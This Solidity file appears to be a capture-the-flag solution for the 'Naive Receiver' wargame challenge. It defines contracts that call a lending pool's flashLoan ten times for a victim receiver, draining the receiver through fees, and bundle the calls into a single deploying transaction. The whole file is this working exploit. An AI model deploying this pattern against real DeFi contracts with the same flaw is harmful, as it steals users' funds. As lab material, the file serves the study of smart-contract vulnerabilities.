// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract Attack {
    NaiveReceiverLenderPool pool;

    constructor(address payable poolAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
    }

    function attack(address borrower) external {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(borrower, 0);
        }
    }
}

contract SingleAttack {
    Attack attackContract;

    constructor(address payable poolAddress, address borrowerContract) {
        attackContract = new Attack(poolAddress);
        attackContract.attack(borrowerContract);
    }
}
